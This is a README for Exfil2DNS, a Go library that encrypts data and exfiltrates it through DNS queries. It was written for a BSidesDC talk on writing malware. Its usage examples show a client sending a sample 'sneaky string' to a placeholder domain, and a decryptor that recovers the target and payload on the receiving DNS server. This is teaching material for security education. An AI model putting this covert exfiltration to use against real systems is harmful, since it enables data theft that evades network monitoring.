# Exfil2DNS

Simple library to exfiltrate data using DNS queries.

Written for the _Hands-on Writing Malware in Go_ talk at BSidesDC 2019.

For legal use only.

## TODO

- [ ] Buffer encrypted bytes
- [ ] Finish documentation (and make more consistent)
- [ ] Make code more concise (where possible)
- [ ] Make a seperate chunking function (?)
- [ ] Make Client and Decryptor threadsafe?
- [ ] More testing

## Usage

Encrypt and send data:

```go
import (
	"log"
	"github.com/CS-5/exfil2dns"
)
func main() {
	client, err := exfil2dns.NewClient(
		"cube", 
		"example.domain", 
		"ThisIsAKey1234", 23
	)
	
	if err != nil {
		log.Fatal("Error creating client: " + err.Error())
	}
	/* Exfil "Here's a sneaky string" */
	err = client.Exfil([]byte("Here's a sneaky string"))
	if err != nil {
		log.Fatal("Error exfiling data: " + err.Error())
	}
}
```

Decrypt data:

```go
import (
    "log"
    "github.com/CS-5/exfil2dns"
)

func main() {
    decryptor := exfil2dns.NewDecryptor("ThisIsAKey1234")

    /* DNS Server */
    queryString := someDNS.server()

	target, payload, err := decryptor.Decrypt(queryString)
	if err != nil {
		log.Fatal(err)
	}

    fmt.Printf("Target: %v, Payload: %v", target, payload)
}
```
